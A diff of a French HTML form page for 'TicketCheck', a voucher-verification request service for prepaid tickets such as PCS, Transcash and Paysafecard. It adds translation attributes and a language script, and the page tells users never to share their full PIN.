@@ -1,11 +1,14 @@
-﻿<!DOCTYPE html>
+﻿
+<!DOCTYPE html>
 <html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#061326">
 <title>TicketCheck — Demande de vérification</title>
 <link rel="stylesheet" href="style.css">
 </head>
+
 <body>
 
 <header class="navbar">
@@ -13,94 +16,158 @@
     <span class="brand-mark">TC</span>
     <span class="brand-text">
       <strong>Ticket<span>Check</span></strong>
-      <small>Vérification de tickets en ligne</small>
+      <small data-i18n="footer">Vérification de tickets en ligne</small>
     </span>
   </a>
-  <a class="free-btn" href="index.html">← &nbsp; ACCUEIL</a>
+
+  <a class="free-btn" href="index.html" data-i18n="home">← ACCUEIL</a>
 </header>
 
 <main class="form-page">
+
 <section class="form-card">
 
-<div class="form-title">
-  <span class="eyebrow">DEMANDE DE VÉRIFICATION</span>
-  <h1>Envoyez votre demande</h1>
-  <p>Remplissez les informations ci-dessous. Le service est entièrement gratuit.</p>
-</div>
+  <div class="form-title">
+    <span class="eyebrow" data-i18n="formEyebrow">DEMANDE DE VÉRIFICATION</span>
 
-<div class="security-note">
-  <strong>🔒 Important</strong>
-  <span>Ne communiquez jamais le code PIN secret complet de votre ticket. Utilisez uniquement la référence ou l’identifiant visible du ticket.</span>
-</div>
+    <h1 data-i18n="formTitle">Envoyez votre demande</h1>
 
-<form id="ticketForm">
+    <p data-i18n="formDescription">
+      Remplissez les informations ci-dessous. Le service est entièrement gratuit.
+    </p>
+  </div>
 
-<div class="field">
-<label for="provider">Type de ticket</label>
-<select id="provider" required>
-<option value="">Sélectionnez un type</option>
-<option>PCS</option>
-<option>Transcash</option>
-<option>Neosurf</option>
-<option>Paysafecard</option>
-<option>Toneo First</option>
-<option>Autre</option>
-</select>
-</div>
+  <div class="security-note">
+    <strong data-i18n="important">🔒 Important</strong>
 
-<div class="field">
-<label for="amount">Prix du ticket (EUR €)</label>
-<input id="amount" type="number" min="0" step="0.01" placeholder="Ex. 50" required>
-</div>
+    <span data-i18n="securityText">
+      Ne communiquez jamais le code PIN secret complet de votre ticket.
+      Utilisez uniquement la référence ou l’identifiant visible du ticket.
+    </span>
+  </div>
 
-<div class="field">
-<label for="purchase_date">Date d'achat</label>
-<input id="purchase_date" type="date">
-</div>
+  <form id="ticketForm">
 
-<div class="field">
-<label for="country">Pays</label>
-<input id="country" type="text" value="France" required>
-</div>
+    <div class="field">
+      <label for="provider" data-i18n="ticketType">Type de ticket</label>
 
-<div class="field">
-<label for="customer_name">Nom / Prénom</label>
-<input id="customer_name" type="text" placeholder="Votre nom" required>
-</div>
+      <select id="provider" required>
+        <option value="" data-i18n="selectType">Sélectionnez un type</option>
+        <option value="PCS">PCS</option>
+        <option value="Transcash">Transcash</option>
+        <option value="Neosurf">Neosurf</option>
+        <option value="Paysafecard">Paysafecard</option>
+        <option value="Toneo First">Toneo First</option>
+        <option value="Autre" data-i18n="other">Autre</option>
+      </select>
+    </div>
 
-<div class="field">
-<label for="customer_contact">Contact</label>
-<input id="customer_contact" type="text" placeholder="WhatsApp, téléphone ou email" required>
-</div>
+    <div class="field">
+      <label for="amount" data-i18n="ticketPrice">Prix du ticket (EUR €)</label>
 
-<div class="field">
-<label for="ticket_reference">Référence du ticket</label>
-<input id="ticket_reference" type="text" placeholder="Référence ou identifiant visible sur le ticket" required>
-</div>
+      <input
+        id="amount"
+        type="number"
+        min="0"
+        step="0.01"
+        placeholder="Ex. 50"
+        data-i18n-placeholder="amountPlaceholder"
+        required
+      >
+    </div>
 
-<div class="field">
-<label for="notes">Informations complémentaires <small>(facultatif)</small></label>
-<textarea id="notes" rows="4" placeholder="Ajoutez une précision si nécessaire..."></textarea>
-</div>
+    <div class="field">
+      <label for="purchase_date" data-i18n="purchaseDate">Date d'achat</label>
 
-<button class="submit-btn" type="submit">Envoyer ma demande →</button>
-<p id="formMessage" class="form-message"></p>
+      <input id="purchase_date" type="date">
+    </div>
 
-</form>
+    <div class="field">
+      <label for="country" data-i18n="country">Pays</label>
+
+      <input id="country" type="text" value="France" required>
+    </div>
+
+    <div class="field">
+      <label for="customer_name" data-i18n="customerName">Nom / Prénom</label>
+
+      <input
+        id="customer_name"
+        type="text"
+        placeholder="Votre nom"
+        data-i18n-placeholder="namePlaceholder"
+        required
+      >
+    </div>
+
+    <div class="field">
+      <label for="customer_contact" data-i18n="customerContact">Contact</label>
+
+      <input
+        id="customer_contact"
+        type="text"
+        placeholder="WhatsApp, téléphone ou email"
+        data-i18n-placeholder="contactPlaceholder"
+        required
+      >
+    </div>
+
+    <div class="field">
+      <label for="ticket_reference" data-i18n="ticketReference">Référence du ticket</label>
+
+      <input
+        id="ticket_reference"
+        type="text"
+        placeholder="Référence ou identifiant visible sur le ticket"
+        data-i18n-placeholder="referencePlaceholder"
+        required
+      >
+    </div>
+
+    <div class="field">
+      <label for="notes">
+        <span data-i18n="extraInfo">Informations complémentaires</span>
+        <small data-i18n="optional">(facultatif)</small>
+      </label>
+
+      <textarea
+        id="notes"
+        rows="4"
+        placeholder="Ajoutez une précision si nécessaire..."
+        data-i18n-placeholder="notesPlaceholder"
+      ></textarea>
+    </div>
+
+    <button class="submit-btn" type="submit" data-i18n="sendRequest">
+      Envoyer ma demande →
+    </button>
+
+    <p id="formMessage" class="form-message"></p>
+
+  </form>
+
 </section>
 </main>
 
 <footer>
-<a class="brand" href="index.html">
-<span class="brand-mark">TC</span>
-<span class="brand-text">
-<strong>Ticket<span>Check</span></strong>
-<small>Vérification de tickets en ligne</small>
-</span>
-</a>
-<p>Vos informations sont utilisées uniquement pour traiter votre demande.</p>
+
+  <a class="brand" href="index.html">
+    <span class="brand-mark">TC</span>
+
+    <span class="brand-text">
+      <strong>Ticket<span>Check</span></strong>
+      <small data-i18n="footer">Vérification de tickets en ligne</small>
+    </span>
+  </a>
+
+  <p data-i18n="footerPrivacy">
+    Vos informations sont utilisées uniquement pour traiter votre demande.
+  </p>
+
 </footer>
 
+<script src="lang.js"></script>
 <script type="module" src="formulaire.js"></script>
+
 </body>
 </html>
